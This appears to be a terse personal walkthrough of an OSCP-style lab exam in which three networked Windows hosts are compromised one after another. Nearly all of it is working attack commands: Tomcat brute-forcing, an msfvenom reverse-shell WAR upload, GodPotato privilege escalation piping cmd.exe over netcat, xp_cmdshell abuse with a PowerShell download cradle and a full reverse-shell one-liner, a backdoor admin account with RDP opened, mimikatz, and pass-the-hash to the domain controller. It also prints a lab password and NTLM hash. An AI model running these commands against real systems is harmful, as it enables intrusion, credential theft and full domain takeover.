
All machines on same network
Nmap scan

nmap -p- -sV -sC -Pn 192.168.102.100 --open 
nmap -p- -sV -sC -Pn 192.168.102.101 --open 
nmap -p- -sV -sC -Pn 192.168.102.102 --open 

port 8080 open apache tomcat 8.5.91, tried with default usernames

hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://192.168.102.101:8080/manager/html - Unsuccessful

gobuster tomcat - unsuccessful

gobuster dir -u http://192.168.102.101:8080 -w /usr/share/seclists/Discovery/Web-Content/ApacheTomcat.fuzz.txt 

Query DC for usernames

nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=administrator,cn=users,dc=exam,dc=exam",ldap.qfilter=users,ldap.attrib=sAMAccountName' -Pn 192.168.102.100

ldap search

ldapsearch -x -b "dc=oscp,dc=exam" "*" -H ldap://192.168.102.100  | awk '/dn: / {print $2}'

tried with lisa lisa on tomcat , got the access

created msfvenom shell

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.49.102 LPORT=8080 -f war -o revshell_jsp.war

logged into tomcat with lisa lisa 
uploaded war file on http://192.168.102.101:8080/manager/html/list

start listener on port nc -nlvp 8080 and click on uploaded shell

got reverse connection
got local flag

privesc

checked privileges   whoami /all
SeImpersonatePrivilege Enabled, printspoofer vulnerability should work

Used GodPotato [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato "https://github.com/BeichenDream/GodPotato")

wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe

curl http://192.168.49.102/GodPotato-NET4.exe -o GodPotato-NET4.exe

download nc.exe
https://github.com/int0x33/nc.exe/tree/master

GodPotato-NET4.exe -cmd "nc.exe 192.168.49.102 80 -e cmd.exe"

limited shell therefore added new user and enabled rdp

net user /add jack Password@12345
net localgroup administrators jack /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="Open Remote Desktop" protocol=TCP dir=in localport=3389 action=allow

using remmina got RDP access

found stickynotes in administrator Documents
Opened with Stick notes application

found password of svc_sql

tried on 102 with crackmapexec mssql

crackmapexec mssql 192.168.102.102 -u svc_sql -p "Hard2Work4Style8"

valid user

reverted 101

netsh advfirewall firewall delete rule name="Open Remote Desktop"
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"
net user /delete jack

used impacket-mssqlclient

EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
xp_cmdshell "whoami"

revershell from mssql

EXEC xp_cmdshell 'echo IEX (New-Object Net.WebClient).DownloadString("http://192.168.49.102/rev.ps1") | powershell -noprofile'

$client = New-Object System.Net.Sockets.TCPClient('192.168.49.102',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 


started listener on nc -nlvp 8080
got reverseconnection
got local flag
whoami /priv
uploaded GodPotato and nc

curl http://192.168.49.102/nc.exe -o nc.exe
curl http://192.168.49.102/GodPotato-NET4.exe -o GodPotato-NET4.exe
started listener nc -nlvp 80
.\GodPotato-NET4.exe -cmd "C:\users\svc_sql\Desktop\nc64.exe 192.168.49.102 80 -e cmd.exe"
got reverseconnection
got proof
uploaded mimikatz
https://github.com/gentilkiwi/mimikatz/releases

curl http://192.168.49.102:443/mimikatz.exe -o mimikatz.exe

tried cme smb on DC with betty hash 
crackmapexec smb 192.168.102.100 -u betty -H fa680f1c00205958367965bd2102e92c 
Pwned
accessed DC using impacket-psexec

impacket-psexec -hashes 00000000000000000000000000000000:fa680f1c00205958367965bd2102e92c betty@192.168.102.100















